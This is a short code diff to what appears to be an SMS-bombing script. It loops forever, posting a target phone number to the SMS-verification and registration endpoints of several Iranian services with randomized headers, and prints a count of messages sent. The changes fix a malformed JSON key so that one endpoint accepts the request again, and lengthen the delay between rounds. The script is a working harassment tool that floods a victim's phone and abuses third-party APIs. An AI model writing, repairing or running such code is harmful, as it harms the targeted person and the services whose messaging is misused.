@@ -9,7 +9,7 @@ url_snapp2 = "https://api.snapp.ir/api/v1/sms/link"
 json_snapp2 = {"phone" : "0" + number }
 
 url_nama = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
-json_nama = {"UserName " : "+98" + number}
+json_nama = {"UserName" : "+98" + number}
 
 url_tlnt = "https://rest.talentcoach.ir/api/v1/service/trainees/"
 jsno_tlnt = {"cellphone": "+98" + number}
@@ -51,4 +51,4 @@ while True:
     req3 = requests.post(url= url_tlnt,json=jsno_tlnt,headers=random_head)
     print('3 SMS-SENT')
     
-    time.sleep(1)
+    time.sleep(2)
